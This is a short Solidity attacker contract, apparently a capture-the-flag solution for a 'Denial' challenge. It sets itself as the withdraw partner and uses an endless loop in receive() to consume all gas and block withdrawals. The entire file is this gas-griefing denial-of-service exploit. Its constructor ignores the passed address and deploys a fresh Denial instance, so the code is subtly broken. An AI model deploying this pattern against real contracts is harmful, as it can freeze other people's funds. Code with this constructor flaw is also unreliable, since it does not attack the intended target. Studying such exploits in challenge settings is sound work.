// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttacker {
    Denial public denial;

    constructor(address _denial) {
        denial = new Denial();
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
